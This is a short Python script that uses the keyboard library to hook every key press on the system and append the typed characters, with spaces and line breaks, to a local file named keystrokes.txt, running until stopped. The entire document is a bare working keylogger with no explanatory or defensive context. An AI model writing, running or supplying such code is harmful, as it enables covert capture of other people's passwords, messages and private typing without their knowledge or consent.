import keyboard

log_file = 'keystrokes.txt'
buffer = []

def on_key_press(event):
    global buffer
    key = event.name
    
    if key == 'space':
        buffer.append(' ')
    elif key == 'enter':
        buffer.append('\n')
    elif len(key) == 1:
        buffer.append(key)
    else:
        pass

    with open(log_file, 'a') as f:
        f.write(''.join(buffer))
        buffer = []

keyboard.on_press(on_key_press)
keyboard.wait() 
